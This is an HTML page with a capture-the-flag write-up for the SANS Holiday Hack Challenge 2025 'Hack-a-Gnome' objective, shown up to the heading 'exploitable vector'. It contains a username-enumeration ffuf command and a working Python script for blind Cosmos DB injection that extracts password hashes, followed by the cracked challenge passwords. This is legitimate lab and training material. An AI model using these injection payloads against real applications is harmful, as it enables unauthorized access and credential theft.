<!DOCTYPE html>
<html lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="html">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <meta name="generator" content="Hugo 0.152.2">
    <meta name="generator" content="Relearn 8.2.0+926ba4d1230e27319cf62da0633eb3420e6af1bf">
    <meta name="description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta name="author" content="">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <meta name="twitter:description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta property="og:url" content="http://localhost:1313/act3/hack-a-gnome/index.html">
    <meta property="og:site_name" content="SANS Holiday Hack Challenge 2025">
    <meta property="og:title" content="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <meta property="og:description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta property="og:locale" content="en_us">
    <meta property="og:type" content="website">
    <meta itemprop="name" content="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <meta itemprop="description" content="Objective Difficulty Description 3/5 Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun. Chris Daves mission statement Hi, my name is Chris.
I like miniature war gaming and painting minis.
I enjoy open source projects and amateur robotics.
Hiking and kayaking are my favorite IRL activies.
I love single player video games with great stoylines.
Hey, I could really use another set of eyes on this gnome takeover situation.">
    <meta itemprop="datePublished" content="2025-12-23T15:59:59+01:00">
    <meta itemprop="dateModified" content="2025-12-23T15:59:59+01:00">
    <meta itemprop="wordCount" content="3278">
    <title>Hack-a-Gnome :: SANS Holiday Hack Challenge 2025</title>
    <link href="/act3/hack-a-gnome/index.xml" rel="alternate" type="application/rss+xml" title="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1767537315" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1767537315" rel="stylesheet"></noscript>
    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1767537315" rel="stylesheet">
    <link href="/css/theme.css?1767537315" rel="stylesheet">
    <link href="/css/format-html.css?1767537315" rel="stylesheet" id="R-format-style">
    <script>
      window.relearn = window.relearn || {};
      // configuration
      window.relearn.min = ``;
      window.relearn.path='\/act3\/hack-a-gnome\/index.html';
      window.relearn.relBasePath='..\/..';
      window.relearn.relBaseUri='..\/..';
      window.relearn.absBaseUri='http:\/\/localhost:1313';
      window.relearn.disableAnchorCopy=false;
      window.relearn.disableAnchorScrolling=false;
      window.relearn.disableInlineCopyToClipboard=false;
      window.relearn.enableBlockCodeWrap=true;
      // legal
      window.relearn.getItem = (s,n) => {return s.getItem(n)};
      window.relearn.setItem = (s,n,v) => {return s.setItem(n,v)};
      window.relearn.removeItem = (s,n) => {return s.removeItem(n)};
      // translations
      window.T_Copy_to_clipboard = `Copy to clipboard`;
      window.T_Copied_to_clipboard = `Copied to clipboard!`;
      window.T_Copy_link_to_clipboard = `Copy link to clipboard`;
      window.T_Link_copied_to_clipboard = `Copied link to clipboard!`;
      window.T_Reset_view = `Reset view`;
      window.T_View_reset = `View reset!`;
      window.T_No_results_found = `No results found for "{0}"`;
      window.T_N_results_found = `{1} results found for "{0}"`;
      // variant stuff
      window.relearn.themevariants = [ 'hhc-2025' ];
      window.relearn.customvariantname = "my-custom-variant";
      window.relearn.changeVariant = function(variant) {
        var oldVariant = document.documentElement.dataset.rThemeVariant;
        window.relearn.setItem(window.localStorage, window.relearn.absBaseUri + "/variant", variant);
        document.documentElement.dataset.rThemeVariant = variant;
        if (oldVariant != variant) {
          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
          window.relearn.markVariant();
        }
      }
      window.relearn.markVariant = function() {
        var variant = window.relearn.getItem(window.localStorage, window.relearn.absBaseUri + "/variant");
        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
      }
      window.relearn.initVariant = function() {
        var variant = window.relearn.getItem(window.localStorage, window.relearn.absBaseUri + "/variant") ?? "";
        if( variant == window.relearn.customvariantname ){
        }else if( !variant || !window.relearn.themevariants.includes(variant) ){
          variant = window.relearn.themevariants[0];
          window.relearn.setItem(window.localStorage, window.relearn.absBaseUri + "/variant", variant);
        }
        document.documentElement.dataset.rThemeVariant = variant;
      }
      window.relearn.initVariant();
      window.relearn.markVariant();
    </script>
  </head>
  <body class="mobile-support html" data-url="/act3/hack-a-gnome/index.html">
    <div id="R-body" class="default-animation">
      <div id="R-body-overlay"></div>
      <nav id="R-topbar">
        <div class="topbar-wrapper">
          <div class="topbar-sidebar-divider"></div>
          <div class="topbar-area topbar-area-start" data-area="start">
            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
<span class="btn cstyle link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
            </div>
            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-list-alt"></i></button></span>
              <div class="topbar-content">
                <div class="topbar-content-wrapper">
<nav class="TableOfContents">
  <ul>
    <li><a href="#objective">Objective</a></li>
    <li><a href="#chris-daves-mission-statement">Chris Daves mission statement</a></li>
    <li><a href="#solution">Solution</a>
      <ul>
        <li><a href="#inspecting-smart-gnome-control-source-code">Inspecting SMART GNOME CONTROL source code</a></li>
        <li><a href="#enumerating-database">Enumerating database</a></li>
        <li><a href="#enumerating-users">Enumerating users</a></li>
        <li><a href="#finding-passwords">Finding passwords</a></li>
        <li><a href="#the-control-panel---endpoints">The control panel - endpoints</a></li>
        <li><a href="#the-control-panel---exploitable-vector">The control panel - exploitable vector</a></li>
        <li><a href="#the-control-panel---exploiting">The control panel - exploiting</a></li>
        <li><a href="#setup-attack-infrastructure">Setup attack infrastructure</a></li>
        <li><a href="#the-attack">The attack</a></li>
        <li><a href="#enumerating-control-codes">Enumerating control codes</a></li>
      </ul>
    </li>
    <li><a href="#chris-davis-closing-words">Chris Davis closing words</a>
      <ul>
        <li><a href="#hints">Hints</a></li>
      </ul>
    </li>
    <li><a href="#resources">Resources</a></li>
  </ul>
</nav>
                </div>
              </div>
            </div>
          </div>
          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Sans Holiday Hack Challenge 2025 - Introduction</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/act3/index.html"><span itemprop="name">Act 3</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">Hack-a-Gnome</span><meta itemprop="position" content="3"></li>
          </ol>
          <div class="topbar-area topbar-area-end" data-area="end">
            <div class="topbar-button topbar-button-prev" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><a href="/act3/gnome-tea/index.html" title="Gnome Tea (ðŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
            </div>
            <div class="topbar-button topbar-button-next" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><a href="/act3/snowcat-rce-and-priv-esc/index.html" title="Snowcat RCE & Priv Esc (ðŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
            </div>
            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
<span class="btn cstyle link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
              <div class="topbar-content">
                <div class="topbar-content-wrapper">
                  <div class="topbar-area topbar-area-more" data-area="more">
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </nav>
      <div id="R-main-overlay"></div>
      <main id="R-body-inner" class="highlightable act3" tabindex="-1">
        <div class="flex-block-wrapper">
<article class="default">
  <header class="headline">
  </header>

<h1 id="hack-a-gnome">Hack-a-Gnome</h1>

<p><a href="#R-image-acb910ea8a546d07823991675559bc0f" class="lightbox-link"><img alt="Chris Daves" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-acb910ea8a546d07823991675559bc0f"><img alt="Chris Daves" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif"></a></p>
<h2 id="objective">Objective</h2>
<table>
  <thead>
      <tr>
          <th>Difficulty</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>3/5</td>
          <td>Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun.</td>
      </tr>
  </tbody>
</table>
<h2 id="chris-daves-mission-statement">Chris Daves mission statement</h2>
<blockquote>
<p>Hi, my name is Chris.</p>
<p>I like miniature war gaming and painting minis.</p>
<p>I enjoy open source projects and amateur robotics.</p>
<p>Hiking and kayaking are my favorite IRL activies.</p>
<p>I love single player video games with great stoylines.</p>
<hr>
<p>Hey, I could really use another set of eyes on this gnome takeover situation.</p>
<p>Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!</p>
<p>But every system has weaknesses if you know where to look.</p>
<p>If these gnomes freeze the whole neighborhood, forget about hiking or kayakingâ€”everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.</p>
<p>Ready to help me turn one of these rebellious bots against its own kind?</p>
</blockquote>
<h2 id="solution">Solution</h2>
<p>This objective shifts from passive discovery to active interaction with a simulated adversary environment, requiring me to reason about layered defenses rather than a single vulnerability. By engaging with the hack-a-gnome interface, I had to identify how application logic, state handling, and game mechanics interact, mirroring real-world scenarios where attackers chain multiple small weaknesses instead of relying on one critical flaw. The challenge emphasizes understanding system behavior as a whole rather than treating vulnerabilities in isolation.</p>
<p>This objective is hosted on <a href="https://hhc25-smartgnomehack-prod.holidayhackchallenge.com" rel="external">https://hhc25-smartgnomehack-prod.holidayhackchallenge.com</a>. Upon entering it I were presented with the following landingpage:</p>
<p><a href="#R-image-2d5d5e607b1b2a1d48c196c5aedd2c70" class="lightbox-link"><img alt="First landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-2d5d5e607b1b2a1d48c196c5aedd2c70"><img alt="First landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png"></a></p>
<p>Not much information to begin with, but in tradition with other CTF&rsquo;s I started inspecting the sources. Early on I also retrieved all hints for this objective. These are included at the very end of this writeup.</p>
<h3 id="inspecting-smart-gnome-control-source-code">Inspecting SMART GNOME CONTROL source code</h3>
<p>In the HTML source I found an interesting Javascript file: <code>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js</code>. By reading it I was able to uncover few interesting endpoints:</p>
<table>
  <thead>
      <tr>
          <th>Endpoint</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>/register</td>
          <td>Endpoint for registering a new user</td>
      </tr>
      <tr>
          <td>/userAvailable?username=</td>
          <td>In use to check wheter a username is available for registion upon creating a new user</td>
      </tr>
  </tbody>
</table>
<h3 id="enumerating-database">Enumerating database</h3>
<p>From the looks of it the only endpoint taking arguments is <em>/userAvailable</em>. By performing a standard test by supplying a single quotation mark I was able to trigger an error message that disclosed which database I were facing:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Output:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{&#34;</span>error<span style="color:#e6db74">&#34;:&#34;</span>An error occurred <span style="color:#66d9ef">while</span> checking username: Message: <span style="color:#f92672">{</span><span style="color:#ae81ff">\&#34;</span>errors<span style="color:#ae81ff">\&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#ae81ff">\&#34;</span>severity<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Error<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>location<span style="color:#ae81ff">\&#34;</span>:<span style="color:#f92672">{</span><span style="color:#ae81ff">\&#34;</span>start<span style="color:#ae81ff">\&#34;</span>:44,<span style="color:#ae81ff">\&#34;</span>end<span style="color:#ae81ff">\&#34;</span>:45<span style="color:#f92672">}</span>,<span style="color:#ae81ff">\&#34;</span>code<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>SC1012<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>message<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Syntax error, invalid string literal token <span style="color:#e6db74">&#39;\\\&#34;&#39;</span>.<span style="color:#ae81ff">\&#34;</span><span style="color:#f92672">}]}</span><span style="color:#ae81ff">\r\n</span>ActivityId: fc87623e-4f9b-4d3d-9b18-f56fefa1b5d9, Microsoft.Azure.Documents.Common/2.14.0<span style="color:#e6db74">&#34;}</span></span></span></code></pre></div>
<p>The error message did not state it was Cosmos DB in cleartext - however I used ChatGPT to confirm it.</p>
<h3 id="enumerating-users">Enumerating users</h3>
<p>From the hints I now switched focus to enumerating users in order to log in. By looking at the output from the <em>/userAvailable</em> this seemed like a trivial task, given that the endpoint happily returns boolean states. I decided on using <em>FFUF</em> with a list of common names from Seclists:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username<span style="color:#f92672">=</span>FUZZ -X GET -fr <span style="color:#e6db74">&#34;true&#34;</span></span></span></code></pre></div>
<p>Since the feedback from the enpoint basically states <em>available: true or false</em>, thus I added the <code>-fr</code> option to find users not available. The following users were identified:</p>
<ul>
<li>bruce</li>
<li>harold</li>
</ul>
<h3 id="finding-passwords">Finding passwords</h3>
<p>I now had a list of users but no passwords. My next move was to find their passwords, but first I had some reading up to do on Cosmos DB. After reading some query examples on the Net, it became apparent that queries are written much like this example:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> p <span style="color:#66d9ef">WHERE</span> p.something <span style="color:#f92672">=</span> something</span></span></code></pre></div>
<p>The <em>FROM</em> refers to a container or item alias and from the examples I found tends to be a single letter. Further, <em>Cosmos DB</em> doesn&rsquo;t have a fixed schema, so fields can in reality be named whatever. Based on this I formed the following workflow:</p>
<ol>
<li>Identify what the container or item alias could be</li>
<li>Identify whcih fields were in use</li>
<li>Extract passwords</li>
</ol>
<p>For this excercise I decided to leave FFUF be an move on to Python. Working with Python, or any programming languages, is worth gold in CTF&rsquo;s. By using scripts we can easily recreate our methodology consistently. The script is rather basic. It has three core functions:</p>
<table>
  <thead>
      <tr>
          <th>Function</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>find_prefix</td>
          <td>Identify the container or item alias by simply bruteforcing it using the alphabet (limited to one char as examples on the Net shows)</td>
      </tr>
      <tr>
          <td>find_password_field</td>
          <td>After findintg the contaier or item alias I use a wordlist containing Burp parameter names to uncover what the name of the password field is. I tried to use &lsquo;password&rsquo; directly, but it didn&rsquo;t exist.</td>
      </tr>
      <tr>
          <td>find_digest</td>
          <td>With both the container or item alias, and the name of the &lsquo;password&rsquo; field (digest), I bruteforce the password string using an recursive function looping over lower case letters, numbers and &lsquo;-&rsquo;</td>
      </tr>
  </tbody>
</table>
<p>The script looks like this:</p>
<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pprint <span style="color:#f92672">import</span> pprint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Helper function for injection</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">inject</span>(base_url: str, payload: str) <span style="color:#f92672">-&gt;</span> str:
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> base_url <span style="color:#f92672">+</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>json()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Map out prefix</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_prefix</span>(url, username):
</span></span><span style="display:flex;"><span>    prefix_letter <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> prefix <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_letters:
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND IS_DEFINED(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.username) --&#39;</span>
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> inject(base_url, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>keys():
</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        prefix_letter <span style="color:#f92672">=</span> prefix
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> prefix_letter
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Find password field name</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_password_field</span>(url, username, prefix):
</span></span><span style="display:flex;"><span>	fields <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;burp-parameter-names.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>readlines():
</span></span><span style="display:flex;"><span>			needle <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>			payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND IS_DEFINED(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>needle<span style="color:#e6db74">}</span><span style="color:#e6db74">) --&#39;</span>
</span></span><span style="display:flex;"><span>			result <span style="color:#f92672">=</span> inject(url, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>keys():
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;available&#34;</span>) <span style="color:#f92672">is</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>				fields<span style="color:#f92672">.</span>append(needle)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> fields
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Find digest</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_digest</span>(base_url, prefix, candidate<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>, username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;-&#34;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> c <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;:&#34;</span>]:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> candidate <span style="color:#f92672">+</span> c
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND STARTSWITH(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.digest, &#34;</span><span style="color:#e6db74">{</span>p<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;) --&#39;</span>
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> inject(base_url, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(payload)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> result[<span style="color:#e6db74">&#34;available&#34;</span>] <span style="color:#f92672">is</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>            print(p)
</span></span><span style="display:flex;"><span>            find_digest(base_url, prefix, p, username)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Main logic</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=&#34;</span>
</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> find_prefix(base_url, <span style="color:#e6db74">&#34;harold&#34;</span>)
</span></span><span style="display:flex;"><span>fields <span style="color:#f92672">=</span> find_password_field(base_url, <span style="color:#e6db74">&#34;harold&#34;</span>, prefix)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Prefix is: </span><span style="color:#e6db74">{prefix}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Document fields is: &#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">*&#34;</span><span style="color:#f92672">.</span>join(fields))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>find_digest(base_url, prefix, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;harold&#34;</span>)
</span></span><span style="display:flex;"><span>find_digest(base_url, prefix, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;bruce&#34;</span>)</span></span></code></pre></div>
<p>The script uncovers the following:</p>
<ul>
<li>The contaier or item alias is actually <em>c</em></li>
<li>The password field is named <em>digest</em></li>
</ul>
<p>By bruteforcing the <em>digest</em> field I found these passwords:</p>
<table>
  <thead>
      <tr>
          <th>Username</th>
          <th>Digest (MD5)</th>
          <th>Decoded</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>bruce</td>
          <td>d0a9ba00f80cbc56584ef245ffc56b9e</td>
          <td>oatmeal12</td>
      </tr>
      <tr>
          <td>harold</td>
          <td>07f456ae6a94cb68d740df548847f459</td>
          <td>oatmeal!!</td>
      </tr>
  </tbody>
</table>
<p>The digest (passwords) were stored as MD5 - these were easily decoded by looking them up on <a href="https://crackstation.net" rel="external">Crackstation</a>.</p>
<h3 id="the-control-panel---endpoints">The control panel - endpoints</h3>
<p>Upon logging in to the control panel I were presented with the following landingpage:</p>
<p><a href="#R-image-77fe4f537887bfa7a7311b1c1c4308de" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png" style="height: auto;width: auto;"></a>
<a href="javascript:history.back();" class="lightbox-back" id="R-image-77fe4f537887bfa7a7311b1c1c4308de"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png"></a></p>
<p>As usual I started with inspecting the HTML and Javascript source code to reveal the following endpoints:</p>
<table>
  <thead>
      <tr>
          <th>Endpoint</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>/home</td>
          <td>Mainpage, contains two iframes, one for <em>Smart Gnome Statistics</em> panel and <em>Gnome Control Interface</em></td>
      </tr>
      <tr>
          <td>/stats</td>
          <td><em>Smart Gnome Statistics</em> panel</td>
      </tr>
      <tr>
          <td>/control</td>
          <td><em>Gnome Control Interface</em> - where the robot game plays out</td>
      </tr>
      <tr>
          <td>/register</td>
          <td>Endpoint for registering a new user</td>
      </tr>
      <tr>
          <td>/ctrlsignals?message=</td>
          <td>This is used to communicate with backend, for instance updating the robot name. Takes an urlencoded JSON object as input to &lsquo;message&rsquo; argument</td>
      </tr>
  </tbody>
</table>
<h3 id="the-control-panel---exploitable-vector">The control panel - exploitable vector</h3>
